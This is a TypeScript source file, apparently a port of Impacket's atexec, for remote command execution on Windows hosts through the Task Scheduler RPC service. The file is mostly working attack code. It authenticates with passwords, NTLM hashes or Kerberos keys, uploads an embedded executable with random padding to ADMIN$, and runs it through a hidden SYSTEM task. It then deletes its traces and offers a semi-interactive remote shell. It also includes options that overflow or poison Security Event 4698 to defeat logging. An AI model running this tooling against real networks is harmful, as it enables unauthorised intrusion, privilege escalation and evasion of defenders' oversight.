AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjmk9+AAAAAEGFbDsAAAAAEAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAABDGAAAsDcAAEMYAADDGAAAzDcAAMMYAAAnGQAA1DcAACcZAABYGQAA3DcAAFgZAACeGgAA5DcAAJ4aAADtHAAA+DcAAO0cAAAJHQAAFDgAAAkdAAATHQAAHDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';

// --------------------------------------------------------------------------
// TSCH_EXEC -- Task Scheduler based remote command execution
// --------------------------------------------------------------------------

class TSCH_EXEC {
  private username: string;
  private password: string;
  private domain: string;
  private lmhash: string;
  private nthash: string;
  private aesKey: string;
  private doKerberos: boolean;
  private kdcHost: string;
  private command: string;
  private noOutput: boolean;
  private codec: string;
  private silentCommand: boolean;
  private sessionId: number | null;
  private overflow: boolean;
  private authorLog: string;

  constructor(opts: {
    username: string;
    password: string;
    domain: string;
    hashes?: string;
    aesKey?: string;
    doKerberos?: boolean;
    kdcHost?: string;
    command: string;
    noOutput?: boolean;
    codec?: string;
    silentCommand?: boolean;
    sessionId?: number | null;
    overflow?: boolean;
    authorLog?: string;
  }) {
    this.username = opts.username;
    this.password = opts.password;
    this.domain = opts.domain;
    this.lmhash = '';
    this.nthash = '';
    this.aesKey = opts.aesKey ?? '';
    this.doKerberos = opts.doKerberos ?? false;
    this.kdcHost = opts.kdcHost ?? '';
    this.command = opts.command;
    this.noOutput = opts.noOutput ?? false;
    this.codec = opts.codec ?? 'utf-8';
    this.silentCommand = opts.silentCommand ?? false;
    this.sessionId = opts.sessionId ?? null;
    this.overflow = opts.overflow ?? false;
    this.authorLog = opts.authorLog ?? '';

    if (opts.hashes) {
      const parts = opts.hashes.split(':');
      this.lmhash = parts[0] ?? '';
      this.nthash = parts[1] ?? '';
    }
  }

  async play(addr: string): Promise<void> {
    const taskName = randomLetters(8);

    let dce: DCERPC_v5 | null = null;
    let rpctransport: SMBTransport | null = null;
    let taskCreated = false;

    try {
      const stringBinding = `ncacn_np:${addr}[\\pipe\\atsvc]`;
      debug(`StringBinding ${stringBinding}`);

      rpctransport = DCERPCTransportFactory(stringBinding) as SMBTransport;
      rpctransport.setRemoteHost(addr);
      rpctransport.setCredentials(
        this.username,
        this.password,
        this.domain,
        this.lmhash,
        this.nthash,
        this.aesKey || null,
      );
      rpctransport.setKerberos(this.doKerberos, this.kdcHost || null);

      dce = rpctransport.getDceRpc();
      dce.setCredentials(this.username, this.password, this.domain, this.lmhash, this.nthash, this.aesKey);
      dce.setAuthLevel(RPC_C_AUTHN_LEVEL_PKT_PRIVACY);

      await dce.connect();
      await dce.bind(MSRPC_UUID_TSCHS);
      info('Connected to TSCH service');

      const smbConn = rpctransport.getSmbConnection()!;
      const isSessionSpawn = this.sessionId !== null && this.silentCommand;
      const usesBinary = this.sessionId !== null || (!this.noOutput && !this.silentCommand);

      const binaryName = randomLetters(8) + '.exe';
      const cmdFileName = randomLetters(8);
      const outFileName = randomLetters(8);

      let xml: string;
      if (usesBinary) {
        const exeData = Buffer.from(SMBEXECSVC_EXE, 'base64');
        const pad = Buffer.alloc(64 + Math.floor(Math.random() * 192));
        for (let i = 0; i < pad.length; i++) pad[i] = Math.floor(Math.random() * 256);
        const payload = Buffer.concat([exeData, pad]);

        const tid = await smbConn.connectTree('ADMIN$');
        try {
          let fid = await smbConn.createFile(tid, `Temp\\${binaryName}`);
          await smbConn.writeFile(tid, fid, payload);
          await smbConn.closeFile(tid, fid);

          fid = await smbConn.createFile(tid, `Temp\\${cmdFileName}`);
          await smbConn.writeFile(tid, fid, Buffer.from(this.command, 'utf-8'));
          await smbConn.closeFile(tid, fid);
        } finally {
          await smbConn.disconnectTree(tid);
        }
        debug(`Uploaded ${binaryName} (${payload.length} bytes)`);

        const exePath = `C:\\Windows\\Temp\\${binaryName}`;
        const cmdFilePath = `C:\\Windows\\Temp\\${cmdFileName}`;
        const outFilePath = `C:\\Windows\\Temp\\${outFileName}`;
        const binaryArgs = this.sessionId !== null
          ? `${cmdFilePath} ${outFilePath} ${isSessionSpawn ? 'i' : 's'}${this.sessionId}`
          : `${cmdFilePath} ${outFilePath}`;
        xml = this.generateXmlTask(exePath, binaryArgs);
      } else if (this.silentCommand) {
        const parts = this.command.split(' ');
        xml = this.generateXmlTask(parts[0]!, parts.slice(1).join(' '));
      } else {
        xml = this.generateXmlTask('cmd.exe', `/C ${this.command}`);
      }

      const taskPath = `\\${taskName}`;
      info(`Creating task \\${taskName}`);
      debug(`Task XML:\n${xml}`);

      await hSchRpcRegisterTask(
        dce,
        taskPath,
        xml,
        TASK_CREATE,
        NULL,
        TASK_LOGON_NONE,
      );
      taskCreated = true;
      info(`Task \\${taskName} created`);

      // Run task as SYSTEM in session 0 — binary handles session switching internally
      info(`Running task \\${taskName}`);
      await hSchRpcRun(dce, taskPath, [], 0, 0, NULL);
      info(`Task \\${taskName} started`);

      // Wait for the task to run
      await sleep(3000);

      // Delete the task
      info(`Deleting task \\${taskName}`);
      try {
        await hSchRpcDelete(dce, taskPath);
        info(`Task \\${taskName} deleted`);
      } catch (e) {
        warning(`Failed to delete task: ${e}`);
      }
      taskCreated = false;

      // Retrieve output (spawn mode is fire-and-forget — process is visible on target)
      if (usesBinary && !isSessionSpawn) {
        await this.getOutput('ADMIN$', `Temp\\${outFileName}`, rpctransport);
      }
      if (usesBinary) {
        try { await smbConn.deleteFile('ADMIN$', `Temp\\${binaryName}`); } catch {}
      }
    } catch (e) {
      if (taskCreated && dce) {
        try {
          await hSchRpcDelete(dce, `\\${taskName}`);
        } catch {
          // Ignore cleanup errors
        }
      }
      throw e;
    } finally {
      if (dce) {
        try {
          await dce.disconnect();
        } catch {
          // ignore
        }
      }
    }
  }

  private async getOutput(
    share: string,
    outputPath: string,
    rpctransport: SMBTransport,
  ): Promise<void> {
    // Use the SMB connection from the transport to read the output file
    let smbConnection = rpctransport.getSmbConnection();

    if (!smbConnection) {
      warning('No SMB connection available -- cannot retrieve output');
      return;
    }

    // Try to read the output file with retries
    const maxRetries = 15;
    let outputRetrieved = false;

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        const treeId = await smbConnection.connectTree(share);

        let fileId: number | Buffer;
        try {
          fileId = await smbConnection.openFile(
            treeId,
            outputPath,
            FILE_READ_DATA | DELETE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
          );
        } catch (e) {
          const msg = String(e);
          // STATUS_OBJECT_NAME_NOT_FOUND or STATUS_SHARING_VIOLATION
          if (
            msg.includes('0xc0000034') ||
            msg.includes('0xc0000043') ||
            msg.includes('STATUS_OBJECT_NAME_NOT_FOUND') ||
            msg.includes('STATUS_SHARING_VIOLATION')
          ) {
            debug(`Output not ready (attempt ${attempt + 1}/${maxRetries}): ${msg}`);
            try {
              await smbConnection.disconnectTree(treeId);
            } catch {
              // ignore
            }
            await sleep(2000);
            continue;
          }
          throw e;
        }

        let data: Buffer | null = null;
        try {
          data = await smbConnection.readFile(treeId, fileId, 0, 65536, true);
        } catch {
          // STATUS_END_OF_FILE on empty file -- that's OK
        }

        await smbConnection.closeFile(treeId, fileId);

        // Try to delete the temp file
        try {
          await this.deleteOutputFile(smbConnection, treeId, outputPath);
        } catch (e) {
          debug(`Could not delete output file: ${e}`);
        }

        try {
          await smbConnection.disconnectTree(treeId);
        } catch {
          // ignore
        }

        if (data && data.length > 0) {
          try {
            const output = data.toString(this.codec as BufferEncoding);
            process.stdout.write(output);
          } catch {
            error(
              'Decoding error detected, consider running chcp.com at the target,\n' +
              'map the result with https://docs.python.org/3/library/codecs.html#standard-encodings\n' +
              'and then execute atexec again with -codec and the corresponding codec',
            );
            process.stdout.write(data.toString('utf-8'));
          }
        }

        outputRetrieved = true;
        break;
      } catch (e) {
        const msg = String(e);
        if (
          msg.includes('0xc0000011') ||
          msg.includes('0xc0000022') ||
          msg.includes('0xc0000034') ||
          msg.includes('0xc0000043') ||
          msg.includes('STATUS_END_OF_FILE') ||
          msg.includes('STATUS_ACCESS_DENIED') ||
          msg.includes('STATUS_OBJECT_NAME_NOT_FOUND') ||
          msg.includes('STATUS_SHARING_VIOLATION')
        ) {
          debug(`Output not ready (attempt ${attempt + 1}/${maxRetries}): ${msg}`);
          await sleep(2000);
        } else {
          error(`Error reading output: ${msg}`);
          break;
        }
      }
    }

    if (!outputRetrieved) {
      warning('Timed out waiting for output -- the command may still be running');
    }
  }

  private async deleteOutputFile(
    smbConnection: SMBConnection,
    treeId: number,
    outputPath: string,
  ): Promise<void> {
    // Try deleteFile first (works for SMB1)
    try {
      // deleteFile takes share name and path separately, but we already have a treeId.
      // Use the open-with-DELETE_ON_CLOSE approach which works for both SMB1 and SMB3.
      const delFileId = await smbConnection.openFile(
        treeId,
        outputPath,
        DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,
        FILE_OPEN,
        FILE_ATTRIBUTE_NORMAL,
      );
      await smbConnection.closeFile(treeId, delFileId);
      debug('Output file deleted');
    } catch (e) {
      debug(`Delete via open/close failed: ${e}`);
    }
  }

  async interactive(addr: string): Promise<void> {
    const stringBinding = `ncacn_np:${addr}[\\pipe\\atsvc]`;
    debug(`StringBinding ${stringBinding}`);

    const rpctransport = DCERPCTransportFactory(stringBinding) as SMBTransport;
    rpctransport.setRemoteHost(addr);
    rpctransport.setCredentials(
      this.username, this.password, this.domain,
      this.lmhash, this.nthash, this.aesKey || null,
    );
    rpctransport.setKerberos(this.doKerberos, this.kdcHost || null);

    const dce = rpctransport.getDceRpc();
    dce.setCredentials(this.username, this.password, this.domain, this.lmhash, this.nthash, this.aesKey);
    dce.setAuthLevel(RPC_C_AUTHN_LEVEL_PKT_PRIVACY);
    await dce.connect();
    await dce.bind(MSRPC_UUID_TSCHS);
    info('Connected to TSCH service');

    const smbConn = rpctransport.getSmbConnection()!;
    const binaryName = randomLetters(8) + '.exe';
    const exePath = `C:\\Windows\\Temp\\${binaryName}`;

    const exeData = Buffer.from(SMBEXECSVC_EXE, 'base64');
    const pad = Buffer.alloc(64 + Math.floor(Math.random() * 192));
    for (let i = 0; i < pad.length; i++) pad[i] = Math.floor(Math.random() * 256);
    const payload = Buffer.concat([exeData, pad]);
    let tid = await smbConn.connectTree('ADMIN$');
    let fid = await smbConn.createFile(tid, `Temp\\${binaryName}`);
    await smbConn.writeFile(tid, fid, payload);
    await smbConn.closeFile(tid, fid);
    await smbConn.disconnectTree(tid);
    debug(`Uploaded ${binaryName} (${payload.length} bytes)`);

    let cwd = '';

    const runCommand = async (cmdStr: string): Promise<string> => {
      let cmdToRun = cmdStr;
      if (cwd) cmdToRun = `cd /d ${cwd} && ${cmdToRun}`;

      const cmdFileName = randomLetters(8);
      const outFileName = randomLetters(8);
      const cmdFilePath = `C:\\Windows\\Temp\\${cmdFileName}`;
      const outFilePath = `C:\\Windows\\Temp\\${outFileName}`;

      tid = await smbConn.connectTree('ADMIN$');
      fid = await smbConn.createFile(tid, `Temp\\${cmdFileName}`);
      await smbConn.writeFile(tid, fid, Buffer.from(cmdToRun, 'utf-8'));
      await smbConn.closeFile(tid, fid);
      await smbConn.disconnectTree(tid);

      const taskName = randomLetters(8);
      const xml = this.generateXmlTask(exePath, `${cmdFilePath} ${outFilePath}`);
      const taskPath = `\\${taskName}`;
      await hSchRpcRegisterTask(dce, taskPath, xml, TASK_CREATE, NULL, TASK_LOGON_NONE);
      await hSchRpcRun(dce, taskPath, [], 0, 0, NULL);
      await sleep(3000);
      try { await hSchRpcDelete(dce, taskPath); } catch {}

      let output = '';
      try {
        tid = await smbConn.connectTree('ADMIN$');
        for (let attempt = 0; attempt < 10; attempt++) {
          try {
            fid = await smbConn.openFile(tid, `Temp\\${outFileName}`);
            let data: Buffer | null = null;
            try { data = await smbConn.readFile(tid, fid, 0, 65536, true); } catch {}
            await smbConn.closeFile(tid, fid);
            try { await this.deleteOutputFile(smbConn, tid, `Temp\\${outFileName}`); } catch {}
            if (data && data.length > 0) {
              output = data.toString(this.codec as BufferEncoding);
            }
            break;
          } catch {
            await sleep(1000);
          }
        }
        await smbConn.disconnectTree(tid);
      } catch {}
      return output;
    };

    // Get initial cwd
    const cdOut = await runCommand('cd');
    cwd = cdOut.replace(/\r\n/g, '');
    let prompt = cwd + '>';

    console.log('[!] Launching semi-interactive shell - Careful what you execute');

    const rl = createInterface({ input: process.stdin, output: process.stdout, prompt });
    rl.prompt();

    let isClosed = false;
    rl.on('close', () => { isClosed = true; });

    for await (const line of rl) {
      const trimmed = line.trim();
      if (trimmed === 'exit' || trimmed === 'quit') { rl.close(); break; }
      if (trimmed === 'EOF') { console.log(); rl.close(); break; }

      if (trimmed.toLowerCase().startsWith('cd ') || trimmed.toLowerCase() === 'cd') {
        const target = trimmed.slice(3).trim();
        let out: string;
        if (target) {
          out = await runCommand(`cd /d ${target} && cd`);
        } else {
          out = await runCommand('cd');
        }
        if (out) {
          cwd = out.replace(/\r\n/g, '');
          prompt = cwd + '>';
          rl.setPrompt(prompt);
        }
      } else if (trimmed.startsWith('!')) {
        const { execSync } = await import('node:child_process');
        try { process.stdout.write(execSync(trimmed.slice(1), { encoding: 'utf-8' })); } catch (e) { error(String(e)); }
      } else if (trimmed !== '') {
        const out = await runCommand(trimmed);
        if (out) process.stdout.write(out);
      }

      if (isClosed) break;
      rl.prompt();
    }

    // Cleanup binary
    try { await smbConn.deleteFile('ADMIN$', `Temp\\${binaryName}`); } catch {}
    try { await dce.disconnect(); } catch {}
  }

  private generateXmlTask(cmd: string, args: string): string {
    // Author as domain\username, overridden by -author-log or -overflow
    let author: string;
    if (this.authorLog) {
      author = this.authorLog;
    } else if (this.overflow) {
      // 4000-byte Author to overflow Security Event 4698
      author = 'A'.repeat(4000);
    } else {
      author = this.domain
        ? `${this.domain}\\${this.username}`
        : this.username;
    }

    // Use a StartBoundary in the past to ensure the task can run immediately
    const past = new Date();
    past.setMinutes(past.getMinutes() - 5);
    const startBoundary = past.toISOString().replace(/\.\d{3}Z$/, '');

    const xml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>${xmlEscape(author)}</Author>
    <Description></Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>${startBoundary}</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>${xmlEscape(cmd)}</Command>
      <Arguments>${xmlEscape(args)}</Arguments>
    </Exec>
  </Actions>
</Task>`;

    return xml;
  }
}

// --------------------------------------------------------------------------
// CLI argument parsing
// --------------------------------------------------------------------------

async function main(): Promise<void> {
  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args: normalizeArgs(process.argv.slice(2)),
      allowPositionals: true,
      options: {
        'session-id': { type: 'string' },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        codec: { type: 'string', default: 'utf-8' },
        silentcommand: { type: 'boolean', default: false },
        overflow: { type: 'boolean', default: false },
        'author-log': { type: 'string' },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        A: { type: 'string' },
        keytab: { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    process.exit(1);
  }

  if (values.help || positionals.length === 0) {
    console.log(`usage: atexec [-h] [-session-id SESSION_ID] [-ts] [-silentcommand] [-debug]
              [-codec CODEC] [-overflow] [-author-log author]
              [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
              [-dc-ip ip address] [-A authfile] [-keytab KEYTAB]
              target [command ...]

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command to execute at the target (default: ' ')

options:
  -h, --help            show this help message and exit
  -session-id SESSION_ID
                        an existed logon session to use (no output, no
                        cmd.exe)
  -ts                   Adds timestamp to every logging output
  -silentcommand        does not execute cmd.exe to run given command (no
                        output)
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output
  -overflow             overflow Security Event 4698 by setting a 4000-byte
                        Author in the task XML
  -author-log author    poison Security Event 4698 Author field with the
                        given value

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller
  -A authfile           smbclient/mount.cifs-style authentication file
  -keytab KEYTAB        Read keys for SPN from keytab file
`);
    process.exit(positionals.length === 0 ? 1 : 0);
  }

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  const codec = values.codec ?? 'utf-8';

  const target = positionals[0]!;
  let [domain, username, password, remoteName] = parseTarget(target);

  // Handle auth file (-A)
  if (values.A) {
    try {
      const authData = readFileSync(values.A, 'utf-8');
      for (const line of authData.split('\n')) {
        const t = line.trim();
        if (t.startsWith('username=')) username = t.slice(9);
        else if (t.startsWith('password=')) password = t.slice(9);
        else if (t.startsWith('domain=')) domain = t.slice(7);
        else if (t.startsWith('hashes=') && !values.hashes) values.hashes = t.slice(7);
      }
    } catch (e) {
      critical(`Error reading auth file ${values.A}: ${e}`);
      process.exit(1);
    }
  }

  if (
    password === '' &&
    username !== '' &&
    !values.hashes &&
    !values['no-pass'] &&
    !values.aesKey
  ) {
    critical('Password required. Use --hashes, --no-pass, or provide password in the target string.');
    process.exit(1);
  }

  // Handle keytab
  let aesKey = values.aesKey ?? '';
  if (values.keytab) {
    const keys = loadKeytabKeys(values.keytab);
    if (keys.aesKey) aesKey = keys.aesKey;
    if (keys.nthash && !values.hashes) values.hashes = `:${keys.nthash}`;
  }
  const doKerberos = values.k || !!aesKey;

  const command = positionals.slice(1).join(' ');

  const sessionId = values['session-id'] !== undefined
    ? parseInt(values['session-id']!, 10)
    : null;

  const noOutput = values.silentcommand ?? false;

  const executer = new TSCH_EXEC({
    username,
    password,
    domain: domain || '',
    hashes: values.hashes,
    aesKey: aesKey || undefined,
    doKerberos,
    kdcHost: values['dc-ip'],
    command,
    noOutput,
    codec,
    silentCommand: values.silentcommand,
    sessionId,
    overflow: values.overflow,
    authorLog: values['author-log'],
  });

  try {
    if (command === '' && sessionId !== null) {
      critical('-session-id requires a command (no interactive mode).');
      process.exit(1);
    } else if (command === '') {
      await executer.interactive(remoteName);
    } else {
      info(`Executing command on ${remoteName} via Task Scheduler`);
      await executer.play(remoteName);
    }
  } catch (e) {
    critical(String(e));
    if (values.debug) {
      debug((e as Error).stack ?? '');
    }
    process.exit(1);
  }

  process.exit(0);
}

main().catch((e) => {
  critical(String(e));
  process.exit(1);
});
